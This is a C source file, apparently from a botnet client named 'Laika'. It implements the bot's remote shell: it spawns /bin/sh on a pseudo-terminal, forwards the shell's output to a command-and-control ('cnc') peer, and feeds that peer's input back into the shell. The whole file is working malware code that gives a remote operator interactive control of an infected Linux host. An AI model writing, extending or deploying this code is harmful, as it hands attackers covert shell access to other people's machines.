/* platform specific code for opening shells in linux */

#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <pty.h>

#include "lerror.h"
#include "lmem.h"
#include "ltask.h"
#include "bot.h"
#include "shell.h"

struct sLaika_shell {
    int pid;
    int fd;
};

struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows) {
    struct winsize ws;
    struct sLaika_shell *shell = (struct sLaika_shell*)laikaM_malloc(sizeof(struct sLaika_shell));

    ws.ws_col = cols;
    ws.ws_row = rows;
    shell->pid = forkpty(&shell->fd, NULL, NULL, &ws);

    if (shell->pid == 0) {
        /* child process, clone & run shell */
        execlp("/bin/sh", "sh", (char*) NULL);
        exit(0);
    }

    /* make sure our calls to read() & write() do not block */
    if (fcntl(shell->fd, F_SETFL, (fcntl(shell->fd, F_GETFL, 0) | O_NONBLOCK)) != 0) {
        laikaB_freeShell(bot, shell);
        LAIKA_ERROR("Failed to set shell fd O_NONBLOCK");
    }

    /* start shell task */
    bot->shellTask = laikaT_newTask(&bot->tService, LAIKA_SHELL_TASK_DELTA, laikaB_shellTask, (void*)bot);

    return shell;
}

void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
    /* kill the shell */
    kill(shell->pid, SIGTERM);
    close(shell->fd);

    bot->shell = NULL;
    laikaM_free(shell);

    /* stop shell task */
    laikaT_delTask(&bot->tService, bot->shellTask);
    bot->shellTask = NULL;
}

bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
    char readBuf[LAIKA_SHELL_DATA_MAX_LENGTH];
    struct sLaika_peer *peer = bot->peer;
    struct sLaika_socket *sock = &peer->sock;

    int rd = read(shell->fd, readBuf, LAIKA_SHELL_DATA_MAX_LENGTH);

    if (rd > 0) {
        /* we read some input! send to cnc */
        laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
        laikaS_write(sock, readBuf, rd);
        laikaS_endVarPacket(peer);
    } else if (rd == -1) {
        if (LN_ERRNO == LN_EWOULD || LN_ERRNO == EAGAIN)
            return true; /* recoverable, there was no data to read */
        /* not EWOULD or EAGAIN, must be an error! so close the shell */

        /* tell cnc shell is closed */
        laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);

        /* kill shell */
        laikaB_freeShell(bot, shell);
        return false;
    }

    return true;
}

bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char *buf, size_t length) {
    struct sLaika_peer *peer = bot->peer;
    struct sLaika_socket *sock = &peer->sock;
    size_t nLeft;
    int nWritten;

    nLeft = length;
    while (nLeft > 0) {
        if ((nWritten = write(shell->fd, buf, nLeft)) < 0) {
            /* some error occurred */
            if (length == nLeft) {
                /* unrecoverable error */

                /* tell cnc shell is closed */
                laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);

                /* kill shell */
                laikaB_freeShell(bot, shell);
                return false;
            } else { /* recoverable */
                break;
            }
        } else if (nWritten == 0) {
            break;
        }
        nLeft -= nWritten;
        buf += nWritten;
    }

    return true;
}